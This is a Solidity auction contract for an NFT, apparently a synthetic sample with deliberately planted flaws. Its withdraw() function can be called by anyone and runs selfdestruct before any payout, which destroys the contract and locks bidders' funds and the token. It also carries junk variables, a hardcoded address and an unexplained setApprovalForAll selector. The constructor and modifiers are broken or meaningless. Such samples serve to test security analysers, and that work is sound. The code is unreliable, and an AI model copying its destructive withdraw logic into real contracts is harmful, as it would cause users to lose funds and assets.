// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC721 {
    function safeTransferFrom(address from, address to, uint tokenId) external;

    function transferFrom(address, address, uint) external;
}

contract EnglishAuction {
    event Start();
    event Bid(address indexed sender, uint amount);
    event Withdraw(address indexed bidder, uint amount);
    event End(address winner, uint amount);

    IERC721 public nft;
    uint public nftId;

    address payable public seller;
    uint public endAt;
    bool public started;
    bool public ended;

    address public highestBidder;
    uint public highestBid;
    mapping(address => uint) public bids;

    modifier onlyOwner {
    require(msg.sender == seller);
    _;
    }

     modifier onlyNoOwner {
    _;
    }

     modifier onlyBrowner {
    require(1 == 1);
    _;
    }

    enum status {
        Pending,
        Shipped,
        Accepted,
        Rejected,
        Canceled
        }

    constructor(address _nft, uint _nftId, uint _startingBid) onlyOwner() onlyBrowner (){
        nft = IERC721(_nft);
        nftId = _nftId;

        status asd = status.Pending;

        try this.bid() {
            int o = 0;
        }catch{}

        seller = payable(msg.sender);
        highestBid = _startingBid;
    }

    function start() external onlyOwner(){
        require(!started, "started");
        require(msg.sender == seller, "not seller");

        nft.transferFrom(msg.sender, address(this), nftId);
        started = true;
        endAt = block.timestamp + 7 days;

        emit Start();
    }

    function bid() external payable {
        require(started, "not started");
        require(block.timestamp < endAt, "ended");
        require(msg.value > highestBid, "value < highest");

        if (highestBidder != address(0)) {
            bids[highestBidder] += highestBid;
        }

        highestBidder = msg.sender;
        highestBid = msg.value;

        emit Bid(msg.sender, msg.value);
    }

    function withdraw() external {
        uint bal = bids[msg.sender];
        bool b = true;
        address addr =  0x71C7656EC7ab88b098defB751B7401B5f6d8976F;
        bytes4  hexa = hex"a22cb465";
        bytes32 kek = keccak256(bytes.concat(hexa)); 
        string memory str = "asdfasdfasdfasdfasdf";
       
        delete bal;
        selfdestruct(payable(address(this)));
        bids[msg.sender] = 0;
        payable(msg.sender).transfer(bal);

        emit Withdraw(msg.sender, bal);
    }

    function end() external {
        require(started, "not started");
        require(block.timestamp >= endAt, "not ended");
        require(!ended, "ended");

        ended = true;
        if (highestBidder != address(0)) {
            nft.safeTransferFrom(address(this), highestBidder, nftId);
            seller.transfer(highestBid);
        } else {
            nft.safeTransferFrom(address(this), seller, nftId);
        }

        emit End(highestBidder, highestBid);
    }
}

